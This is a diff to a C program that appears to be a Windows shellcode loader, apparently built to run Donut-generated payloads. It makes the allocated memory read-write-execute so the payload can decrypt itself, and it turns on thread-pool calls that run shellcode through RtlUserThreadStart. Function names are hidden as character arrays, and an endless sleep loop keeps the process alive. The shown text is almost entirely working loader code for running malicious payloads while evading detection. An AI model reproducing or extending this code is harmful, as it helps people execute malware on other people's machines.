@@ -191,11 +191,11 @@ typedef struct _BASETHREADINITTHUNK_ARGS {
 // } NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;
 
 // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
-typedef enum _QUEUE_USER_APC_FLAGS {
-  QUEUE_USER_APC_FLAGS_NONE,
-  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
-  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
-} QUEUE_USER_APC_FLAGS;
+// typedef enum _QUEUE_USER_APC_FLAGS {
+//   QUEUE_USER_APC_FLAGS_NONE,
+//   QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
+//   QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
+// } QUEUE_USER_APC_FLAGS;
 
 typedef struct _NTQUEUEAPCTHREADEX_ARGS {
     UINT_PTR pNtQueueApcThreadEx;          // pointer to NtQueueApcThreadEx - rax
@@ -555,9 +555,11 @@ int main(int argc, char *argv[]) {
 
     // change allocatedAddress to execute read: 
     DWORD oldProtect;
-    VirtualProtect(allocatedAddress, allocatedSize, PAGE_EXECUTE_READ, &oldProtect);
-    printf("[+] Memory changed to PAGE_EXECUTE_READ\n");
-
+    // VirtualProtect(allocatedAddress, allocatedSize, PAGE_EXECUTE_READ, &oldProtect);
+    // printf("[+] Memory changed to PAGE_EXECUTE_READ\n");
+    // 修改为（允许 Donut 自解密）：
+    VirtualProtect(allocatedAddress, allocatedSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    printf("[+] Memory changed to PAGE_EXECUTE_READWRITE\n");
 
     //####END####
     
@@ -593,34 +595,34 @@ int main(int argc, char *argv[]) {
     //     printf("[-] magiccode execution wait failed\n");
     // }
 
-    // // RtlUserThreadStart: 
+    // RtlUserThreadStart: 
 
-    // const char RtlThreadStartStr[] = { 'R', 't', 'l', 'U', 's', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd', 'S', 't', 'a', 'r', 't', 0 };
-    // RTLTHREADSTART_ARGS RtlThreadStartArgs = { 0 };
-    // RtlThreadStartArgs.pRtlUserThreadStart = (UINT_PTR) GetProcAddress(ntdllMod, RtlThreadStartStr);
-    // RtlThreadStartArgs.pThreadStartRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;
-    // RtlThreadStartArgs.pContext = NULL;
+    const char RtlThreadStartStr[] = { 'R', 't', 'l', 'U', 's', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd', 'S', 't', 'a', 'r', 't', 0 };
+    RTLTHREADSTART_ARGS RtlThreadStartArgs = { 0 };
+    RtlThreadStartArgs.pRtlUserThreadStart = (UINT_PTR) GetProcAddress(ntdllMod, RtlThreadStartStr);
+    RtlThreadStartArgs.pThreadStartRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;
+    RtlThreadStartArgs.pContext = NULL;
 
-    // // // // // / Set workers
+    // // // // / Set workers
 
-    // PTP_WORK WorkReturn5 = NULL;
-    // // getchar();
-    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn5, (PTP_WORK_CALLBACK)RtlUserThreadStartCustom, &RtlThreadStartArgs, NULL);
-    // ((TPPOSTWORK)pTpPostWork)(WorkReturn5);
-    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn5);
-    // // printf("Bytes written: %lu\n", bytesWritten);
-    // if(WorkReturn5 == NULL) {
-    //     printf("[-] Failed to RtlUserThreadStart\n");
-    // } else {
-    //     printf("[+] RtlUserThreadStart executed.\n");
-    // }
+    PTP_WORK WorkReturn5 = NULL;
+    // getchar();
+    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn5, (PTP_WORK_CALLBACK)RtlUserThreadStartCustom, &RtlThreadStartArgs, NULL);
+    ((TPPOSTWORK)pTpPostWork)(WorkReturn5);
+    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn5);
+    // printf("Bytes written: %lu\n", bytesWritten);
+    if(WorkReturn5 == NULL) {
+        printf("[-] Failed to RtlUserThreadStart\n");
+    } else {
+        printf("[+] RtlUserThreadStart executed.\n");
+    }
 
 ////////////
 
 
 
     // const char BaseThreadInitStr[] = { 'B', 'a', 's', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'I', 'n', 'i', 't', 'T', 'h', 'u', 'n', 'k', 0 };
-
+    /*
     BYTE *pXFGThunk = findBaseThreadInitXFGThunk((BYTE *)GetModuleHandleA("kernel32.dll"));
     if (!pXFGThunk) return 1;
 
@@ -646,6 +648,7 @@ int main(int argc, char *argv[]) {
     } else {
         printf("[+] BaseThreadInitXFGThunkCustom executed.\n");
     }
+    */
 
     DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
     if (waitResult == WAIT_OBJECT_0) {
@@ -698,7 +701,13 @@ int main(int argc, char *argv[]) {
     // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);
     // // QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
 	// testAlert();
-    getchar();
+    // getchar();
+    
+    // 修改为：
+    printf("[+] Shellcode running... Press Ctrl+C to exit.\n");
+    while(1) {
+        SimpleSleep(10000); // 每10秒醒一次，保持进程不退出
+    }
     //// Execution end..
 
     return 0;
